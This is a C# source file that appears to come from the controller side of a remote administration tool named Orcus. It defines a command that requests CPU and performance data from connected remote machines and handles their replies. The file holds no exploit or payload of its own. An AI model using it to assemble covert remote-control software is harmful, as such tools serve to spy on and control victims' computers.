using System;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.LivePerformance;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.LivePerformance
{
    [DescribeCommandByEnum(typeof (LivePerformanceCommunication))]
    public class LivePerformanceCommand : Command
    {
        public event EventHandler<StaticPerformanceData> StaticDataReceived;
        public event EventHandler<LiveData> LiveDataReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            Serializer serializer;
            switch ((LivePerformanceCommunication) parameter[0])
            {
                case LivePerformanceCommunication.ResponseStaticData:
                    serializer = new Serializer(typeof (StaticPerformanceData));
                    StaticDataReceived?.Invoke(this, serializer.Deserialize<StaticPerformanceData>(parameter, 1));
                    LogService.Receive((string) Application.Current.Resources["DataReceived"]);
                    break;
                case LivePerformanceCommunication.ResponseUpdate:
                    serializer = new Serializer(typeof (LiveData));
                    LiveDataReceived?.Invoke(this, serializer.Deserialize<LiveData>(parameter, 1));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetStaticData()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) LivePerformanceCommunication.GetStaticData});
            LogService.Send((string) Application.Current.Resources["GetData"]);
        }

        public void GetLiveData()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) LivePerformanceCommunication.GetUpdate});
        }

        protected override uint GetId()
        {
            return 19;
        }
    }
}